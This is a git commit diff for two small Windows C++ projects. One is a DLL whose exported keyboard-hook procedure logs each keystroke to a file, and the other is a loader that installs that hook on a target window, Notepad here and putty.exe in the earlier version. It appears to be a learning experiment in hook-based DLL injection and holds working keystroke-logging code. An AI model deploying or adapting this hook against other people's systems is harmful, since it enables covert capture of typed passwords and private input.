00edbc9fd0fdcbd4b867f4903c0cc97be762903a
Sam Peddamatham <peddamat@gmail.com>
2022-06-03 00:02:14 -0700

    Fixed the gd bugs.

--- dllinject/dllinject/dllmain.cpp
+++ dllinject/dllinject/dllmain.cpp
@@ -4,35 +4,42 @@
 
 
 INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
-    /* open file */
-    FILE *file;
-    fopen_s(&file, "C:\\temp.txt", "a+");
+	/* open file */
+	FILE* file;
+	fopen_s(&file, "temp.txt", "a+");
 
-    switch(Reason) {
-    case DLL_PROCESS_ATTACH:
-                fprintf(file, "DLL attach function called.\n");
-        break;
-    case DLL_PROCESS_DETACH:
-                fprintf(file, "DLL detach function called.\n");
-        break;
-    case DLL_THREAD_ATTACH:
-                fprintf(file, "DLL thread attach function called.\n");
-        break;
-    case DLL_THREAD_DETACH:
-                fprintf(file, "DLL thread detach function called.\n");
-        break;
-    }
+	switch (Reason) {
+	case DLL_PROCESS_ATTACH:
+		fprintf(file, "DLL attach function called.\n");
+		break;
+	case DLL_PROCESS_DETACH:
+		fprintf(file, "DLL detach function called.\n");
+		break;
+	case DLL_THREAD_ATTACH:
+		fprintf(file, "DLL thread attach function called.\n");
+		break;
+	case DLL_THREAD_DETACH:
+		fprintf(file, "DLL thread detach function called.\n");
+		break;
+	}
 
-    /* close file */
-    fclose(file);
+	/* close file */
+	fclose(file);
 
-    return TRUE;
+	return TRUE;
 }
 
-/*extern "C" __declspec(dllexport) int meconnect(int code, WPARAM wParam, LPARAM lParam) {
-	FILE *file;
-    	fopen_s(&file, "C:\\function.txt", "a+");
-   	fprintf(file, "Function keyboard_hook called.\n");
-	fclose(file);
-	return(CallNextHookEx(NULL, code, wParam, lParam));
-}*/
+extern "C" __declspec(dllexport) LRESULT CALLBACK meconnect(int code, WPARAM wParam, LPARAM lParam) {
+	if (code < 0) // Do not process
+	{
+		return CallNextHookEx(NULL, code, wParam, lParam);
+	}
+	else
+	{
+		FILE* file;
+		fopen_s(&file, "c:\\users\\me\\function4.txt", "a+");
+		fprintf(file, "Function keyboard_hook called: %c\n", wParam);
+		fclose(file);
+		return(CallNextHookEx(NULL, code, wParam, lParam));
+	}
+}
--- setwindowshookex/setwindowshookex/setwindowshookex.cpp
+++ setwindowshookex/setwindowshookex/setwindowshookex.cpp
@@ -1,5 +1,8 @@
 #include "stdafx.h"
 #include <Windows.h>
+#include <conio.h>
+#include <stdio.h>
+
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -7,8 +10,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	/*
 	 * Load library in which we'll be hooking our functions.
 	 */
-	HMODULE dll = LoadLibrary(L"C:\\drivers\\dllinject.dll");
-	if(dll == NULL) {
+	HMODULE dll = LoadLibrary(L"dllinject.dll");
+	if (dll == NULL) {
 		printf("The DLL could not be found.\n");
 		getchar();
 		return -1;
@@ -18,25 +21,27 @@ int _tmain(int argc, _TCHAR* argv[])
 	 * Get the address of the function inside the DLL.
 	 */
 	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "meconnect");
-	if(addr == NULL) {
+	if (addr == NULL) {
 		printf("The function was not found.\n");
 		getchar();
 		return -1;
 	}
 
-	/* 
+	/*
 	 * Window name
 	 */
-	unsigned long procID;
-    HWND targetWnd = FindWindow(NULL, L"putty.exe");
-    GetWindowThreadProcessId(targetWnd, &procID);
+	DWORD procID;
+	HWND targetWnd = FindWindow(L"Notepad", NULL);
+	if (targetWnd == NULL) {
+		printf("Couldn't find app\n");
+	}
+	auto threadID = GetWindowThreadProcessId(targetWnd, &procID);
 
 	/*
 	 * Hook the function.
-	 */ 
-	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, 0);
-	//HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, keyboard_hook, dll, 0);
-	if(handle == NULL) {
+	 */
+	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, threadID);
+	if (handle == NULL) {
 		printf("The KEYBOARD could not be hooked.\n");
 	}
 
@@ -45,6 +50,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	 */
 	printf("Program successfully hooked.\nPress enter to unhook the function and stop the program.\n");
 	getchar();
+
 	UnhookWindowsHookEx(handle);
 
 	return 0;
